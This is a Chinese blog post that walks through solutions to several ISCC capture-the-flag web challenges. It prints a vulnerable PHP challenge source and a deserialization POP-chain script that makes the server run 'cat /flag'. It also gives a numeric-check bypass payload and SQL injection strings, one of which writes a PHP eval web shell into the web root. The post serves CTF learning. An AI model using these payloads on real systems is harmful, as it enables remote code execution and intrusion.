<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="ISCCweb题解"><meta name="keywords" content=""><meta name="author" content="vague huang"><meta name="copyright" content="vague huang"><title>ISCCweb题解 | Tlife</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.2.0'
} </script><meta name="generator" content="Hexo 5.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web1%E2%80%94%E2%80%94ISCC%E5%AE%A2%E6%9C%8D%E5%86%B2%E5%86%B2%E5%86%B2%EF%BC%88%E4%B8%80%EF%BC%89"><span class="toc-number">2.</span> <span class="toc-text">web1——ISCC客服冲冲冲（一）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web2%E2%80%94%E2%80%94%E8%BF%99%E6%98%AF%E5%95%A5"><span class="toc-number">3.</span> <span class="toc-text">web2——这是啥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web3%E2%80%94%E2%80%94%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D"><span class="toc-number">4.</span> <span class="toc-text">web3——正则匹配</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web4%E2%80%94%E2%80%94%E7%99%BB%E5%BD%95"><span class="toc-number">5.</span> <span class="toc-text">web4——登录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web5%E2%80%94%E2%80%94which-is-the-true-iscc"><span class="toc-number">6.</span> <span class="toc-text">web5——which is the true iscc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E2%80%94%E2%80%94%E6%93%82%E5%8F%B0%E9%A2%98-easyweb"><span class="toc-number">7.</span> <span class="toc-text">web——擂台题-easyweb</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="toc-number">7.1.</span> <span class="toc-text">解题过程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E2%80%94%E2%80%94ISCC%E5%AE%A2%E6%9C%8D%E4%B8%80%E5%8F%B7%E5%86%B2%E5%86%B2%E5%86%B2%EF%BC%88%E4%BA%8C%EF%BC%89"><span class="toc-number">8.</span> <span class="toc-text">web——ISCC客服一号冲冲冲（二）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E2%80%94%E2%80%94Explore-Ruby"><span class="toc-number">9.</span> <span class="toc-text">web——Explore Ruby</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LOVE-SSTI%EF%BC%9A"><span class="toc-number">10.</span> <span class="toc-text">LOVE-SSTI：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93%EF%BC%9A"><span class="toc-number">11.</span> <span class="toc-text">小结：</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">vague huang</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">180</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a></div></div></div><div id="content-outer"><div class="no-bg" id="top-container"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Tlife</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">ISCCweb题解</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-05-02</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>web的题大都做过类似的了，所以比较简单。。但是没想到难的题目都在杂项，开始后悔寒假没多学点杂项了。。。</p>
<h2 id="web1——ISCC客服冲冲冲（一）"><a href="#web1——ISCC客服冲冲冲（一）" class="headerlink" title="web1——ISCC客服冲冲冲（一）"></a>web1——ISCC客服冲冲冲（一）</h2><p>F12审查元素，将对面那个客服的voting给删掉，然后它的票就不会增加了，</p>
<h2 id="web2——这是啥"><a href="#web2——这是啥" class="headerlink" title="web2——这是啥"></a>web2——这是啥</h2><p>jsfuck代码，直接F12运行一下就能拿到FLAG</p>
<h2 id="web3——正则匹配"><a href="#web3——正则匹配" class="headerlink" title="web3——正则匹配"></a>web3——正则匹配</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&lt;p&gt;code.txt&lt;/p&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">     </span><br><span class="line">	<span class="keyword">if</span> (preg_match (<span class="string">&quot;/^[a-zA-Z0-9]+$/&quot;</span>, $_GET[<span class="string">&#x27;password&#x27;</span>]) === <span class="literal">FALSE</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#x27;</span>;</span><br><span class="line">	</span><br><span class="line">    &#125;</span><br><span class="line">	  <span class="keyword">else</span> <span class="keyword">if</span> (strlen($_GET[<span class="string">&#x27;password&#x27;</span>]) &lt; <span class="number">8</span> &amp;&amp; $_GET[<span class="string">&#x27;password&#x27;</span>] &gt; <span class="number">9999999</span>)</span><br><span class="line">	&#123;    </span><br><span class="line">    </span><br><span class="line">		<span class="keyword">if</span> (strpos ($_GET[<span class="string">&#x27;password&#x27;</span>], <span class="string">&#x27;*-*&#x27;</span>) !== <span class="literal">FALSE</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span> . $flag);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span>(<span class="string">&#x27;&lt;p&gt;*-* have not been found&lt;/p&gt;&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Invalid password&lt;/p&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>源码如上，首先要字母和数字，然后有个位数限制，并且要数值需要大于9999999，采用科学技术法进行绕过<br>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">6e8*-*</span><br></pre></td></tr></table></figure>

<h2 id="web4——登录"><a href="#web4——登录" class="headerlink" title="web4——登录"></a>web4——登录</h2><p>反序列化字符串逃逸就不说了</p>
<h2 id="web5——which-is-the-true-iscc"><a href="#web5——which-is-the-true-iscc" class="headerlink" title="web5——which is the true iscc"></a>web5——which is the true iscc</h2><p>查看源码:<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210503104045.png" alt="img" style="zoom:67%;"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">ini_set(<span class="string">&#x27;max_execution_time&#x27;</span>, <span class="string">&#x27;5&#x27;</span>);</span><br><span class="line">set_time_limit(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">$status = <span class="string">&quot;new&quot;</span>;</span><br><span class="line">$cmd = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$is_unser_finished = <span class="literal">false</span>;</span><br><span class="line">$iscc_file = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Upload</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $cmd;</span><br><span class="line">        <span class="keyword">global</span> $is_upload;</span><br><span class="line">        $cmd = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;name&#x27;</span>] = randstr(<span class="number">14</span>);</span><br><span class="line">        $is_upload = (count($_FILES) &gt; <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $is_upload;</span><br><span class="line">        <span class="keyword">global</span> $status;</span><br><span class="line">        <span class="keyword">global</span> $iscc_file;</span><br><span class="line">        $status = <span class="string">&quot;upload_fail&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> ($is_upload) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">foreach</span> ($_FILES <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">                $GLOBALS[$key] = $value;</span><br><span class="line">        </span><br><span class="line">            <span class="keyword">if</span>(is_uploaded_file($iscc_file[<span class="string">&#x27;tmp_name&#x27;</span>])) &#123;</span><br><span class="line">                </span><br><span class="line">                $check = @getimagesize($iscc_file[<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>($check !== <span class="literal">false</span>) &#123;</span><br><span class="line"></span><br><span class="line">                    $target_dir = <span class="string">&quot;/var/tmp/&quot;</span>;</span><br><span class="line">                    $target_file = $target_dir . randstr(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (file_exists($target_file)) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;想啥呢？有东西了……&lt;br&gt;&quot;</span>;</span><br><span class="line">                        finalize();</span><br><span class="line">                        <span class="keyword">exit</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> ($iscc_file[<span class="string">&quot;size&quot;</span>] &gt; <span class="number">500000</span>) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;东西塞不进去~&lt;br&gt;&quot;</span>;</span><br><span class="line">                        finalize();</span><br><span class="line">                        <span class="keyword">exit</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (move_uploaded_file($iscc_file[<span class="string">&quot;tmp_name&quot;</span>], $target_file)) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;我拿到了！&lt;br&gt;&quot;</span>;</span><br><span class="line">                        $iscc_file = $target_file;</span><br><span class="line">                        $status = <span class="string">&quot;upload_ok&quot;</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;拿不到:(&lt;br&gt;&quot;</span>;</span><br><span class="line">                        finalize();</span><br><span class="line">                        <span class="keyword">exit</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    finalize();</span><br><span class="line">                    <span class="keyword">exit</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;你真是个天才!&lt;br&gt;&quot;</span>;</span><br><span class="line">                finalize();</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_ResetCMD</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $new_cmd = <span class="string">&quot;echo &#x27;新新世界，发号施令!&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $cmd;</span><br><span class="line">        <span class="keyword">global</span> $is_upload;</span><br><span class="line">        <span class="keyword">global</span> $status;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;name&#x27;</span>] = randstr(<span class="number">14</span>);</span><br><span class="line">        $is_upload = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;new_cmd)) &#123;</span><br><span class="line">            $status = <span class="string">&quot;error&quot;</span>;</span><br><span class="line">            $error = <span class="string">&quot;你这罐子是空的!&quot;</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>($error);   </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!is_string(<span class="keyword">$this</span>-&gt;new_cmd)) &#123;</span><br><span class="line">            $status = <span class="string">&quot;error&quot;</span>;</span><br><span class="line">            $error = <span class="string">&#x27;东西都没给对!&#x27;</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>($error);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $cmd;</span><br><span class="line">        <span class="keyword">global</span> $status;</span><br><span class="line">        $status = <span class="string">&quot;reset&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>($_SESSION[<span class="string">&#x27;name&#x27;</span>] === <span class="string">&#x27;isccIsCciScc1scc&#x27;</span>) &#123;</span><br><span class="line">            $cmd = <span class="keyword">$this</span>-&gt;new_cmd;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Login</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;login();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;logout();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $flag = file_get_contents(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">        $pAssM0rd = hash(<span class="string">&quot;sha256&quot;</span>, $flag);</span><br><span class="line">        <span class="keyword">if</span>($_GET[<span class="string">&#x27;pAssM0rd&#x27;</span>] === $pAssM0rd)</span><br><span class="line">            $_SESSION[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&quot;isccIsCciScc1scc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">logout</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $status;</span><br><span class="line">        <span class="keyword">unset</span>($_SESSION[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $status = <span class="string">&quot;finish&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_TellMeTruth</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;name&#x27;</span>])) </span><br><span class="line">            $_SESSION[<span class="string">&#x27;name&#x27;</span>] = randstr(<span class="number">14</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;似乎这个 &quot;</span>.$_SESSION[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot; 是真相&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;似乎这个 &quot;</span>.$_SESSION[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot; 是真相&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Command</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $cmd;</span><br><span class="line">        <span class="keyword">global</span> $is_upload;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;name&#x27;</span>] = randstr(<span class="number">14</span>);</span><br><span class="line">        $is_upload = <span class="literal">false</span>;</span><br><span class="line">        $cmd = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $cmd;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;看看你干的好事: <span class="subst">&#123;$cmd&#125;</span> &lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $cmd;</span><br><span class="line">        <span class="keyword">global</span> $status;</span><br><span class="line">        <span class="keyword">global</span> $is_unser_finished;</span><br><span class="line">        $status = <span class="string">&quot;cmd&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>($is_unser_finished === <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;看看你干的 [&lt;span style=&#x27;color:red&#x27;&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/span&gt;] 弄出了什么后果: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;span style=&#x27;color:blue&#x27;&gt;&quot;</span>;</span><br><span class="line">            @system($cmd);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/span&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">randstr</span>(<span class="params">$len</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $characters = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_=&#x27;</span>;</span><br><span class="line">    $randstring = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $len; $i++) &#123;</span><br><span class="line">        $randstring .= $characters[rand(<span class="number">0</span>, strlen($characters))];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $randstring;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(stripos($s, <span class="string">&quot;*&quot;</span>) !== <span class="literal">FALSE</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">finalize</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $cmd = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    $is_upload = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">    @unlink($iscc_file);</span><br><span class="line">    $status = <span class="string">&quot;finish&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;whichisthetrueiscc.gif&#x27;&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;whatareyounongshane&#x27;</span>])) &#123;</span><br><span class="line">    $whatareyounongshane = $_GET[<span class="string">&#x27;whatareyounongshane&#x27;</span>];</span><br><span class="line">    <span class="keyword">switch</span> ($whatareyounongshane) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;src&quot;</span>:</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;cmd&quot;</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;想越级干好事？还是有门的……&quot;</span>;</span><br><span class="line">            header(<span class="string">&#x27;Location: /?%3f=O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#x27;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;reset&quot;</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;几辈子积累的好运就在这时~:p&quot;</span>;</span><br><span class="line">            header(<span class="string">&#x27;Location: /?%3f=O:13:&quot;ISCC_ResetCMD&quot;:1:&#123;&#125;&#x27;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;upload&quot;</span>:</span><br><span class="line">            $resp = &lt;&lt;&lt;EOF</span><br><span class="line">&lt;form action=<span class="string">&quot;/index.php?%3f=O:11:%22ISCC_Upload%22:0:&#123;&#125;&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;iscc_file&quot;</span>&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Upload Image&quot;</span> name=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">EOF;</span><br><span class="line">            <span class="keyword">echo</span> $resp;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;tellmetruth&quot;</span>:</span><br><span class="line">            <span class="keyword">echo</span> base64_decode(<span class="string">&quot;PGltZyBzcmM9J3RlbGxtZXRydXRoLmdpZic+Cg==&quot;</span>);</span><br><span class="line">            header(<span class="string">&#x27;Location: /?%3f=O:14:&quot;ISCC_TellMeTruth&quot;:0:&#123;&#125;&#x27;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;空空如也就是我！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    finalize();</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;所以哪个ISCC是真的？&lt;br&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;?&#x27;</span>])) &#123;</span><br><span class="line">    </span><br><span class="line">    $wtf = waf($_GET&#123;<span class="string">&#x27;?&#x27;</span>&#125;) ? $_GET[<span class="string">&#x27;?&#x27;</span>] : (finalize() &amp;&amp; <span class="keyword">die</span>(<span class="string">&quot;试试就“逝世”!&quot;</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>($goodshit = @unserialize($wtf)) &#123;</span><br><span class="line">        $is_unser_finished = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(in_array($status, <span class="keyword">array</span>(<span class="string">&#x27;new&#x27;</span>, <span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;upload_ok&#x27;</span>, <span class="string">&#x27;upload_fail&#x27;</span>, <span class="string">&#x27;reset&#x27;</span>), <span class="literal">true</span>))</span><br><span class="line">        finalize();</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;所以哪个ISCC是真的？&lt;br&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>忘记保存了，重新复述一下吧审计完以后，可以知道我们的目的是执行system指令——》需要更改session[name]的值——》需要upload里面变量覆盖</p>
<p><strong>难点:</strong><br>1.每个类的wakeup函数都重新定义了session[name]，调用每个类的时候，肯定会使用到wakeup，如果当我们的session[name]刚被赋值完iscc…..就被赋值回去了，那就没用了，所以我们需要进行绕过<br>2.由于里面有protect变量，所以也需要绕过waf的过滤<br><strong>解决方案:</strong><br>1.wakeup的调用顺序是由内向外的，destruct的调用是由外向内的,所以我们以类似的嵌套方式（类似）来调用赋值，利用一个中间变量进行中转，这样及时最后用了wake_up函数也没事，因为我们已经执行完了<br>2.可以利用大写S来绕过对protected,private等属性的字符检测，也就是将序列化过程中小写s改为大写s，这样后面的内容我们就可以用十六进制进行表示了</p>
<p>POP链构造:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class ISCC_Upload&#123;</span><br><span class="line">    public $x;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;x&#x3D;new ISCC_ResetCMD();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class ISCC_ResetCMD&#123;</span><br><span class="line">    public $x;</span><br><span class="line">    protected $new_cmd&#x3D;&#39;cat &#x2F;flag&#39;;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;x &#x3D; new ISCC_Command;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class ISCC_Command&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$b&#x3D;new ISCC_Upload();</span><br><span class="line">$a&#x3D;str_replace(&#39;s:10:&quot;&#39;.&quot;\x00*\x00&quot;,&#39;S:10:&quot;\00\2a\00&#39;,serialize($b));</span><br><span class="line">echo urlencode ($a);</span><br><span class="line">&#x2F;&#x2F;这个pop链的构造其实有点类似于嵌套，主要是为了绕过wakeup函数</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210503132753.png" alt="img" style="zoom:67%;">

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210503132758.png" alt="img" style="zoom:67%;">

<p><a target="_blank" rel="noopener" href="https://github.com/ambionics/phpggc#advanced-enhancements">https://github.com/ambionics/phpggc#advanced-enhancements</a></p>
<h2 id="web——擂台题-easyweb"><a href="#web——擂台题-easyweb" class="headerlink" title="web——擂台题-easyweb"></a>web——擂台题-easyweb</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;and%0dsubstr((select%0dgroup_concat),1,1)&gt;&#39;0&#39;--%0d</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union%0dselect%0d1,&quot;&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&quot;%0dinto outfile%0d&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php&#39;</span><br></pre></td></tr></table></figure>

<p>MySQL 5.6 及以上版本存在<code>innodb_index_stats</code>，<code>innodb_table_stats</code>两张表，其中包含新建立的库和表</p>
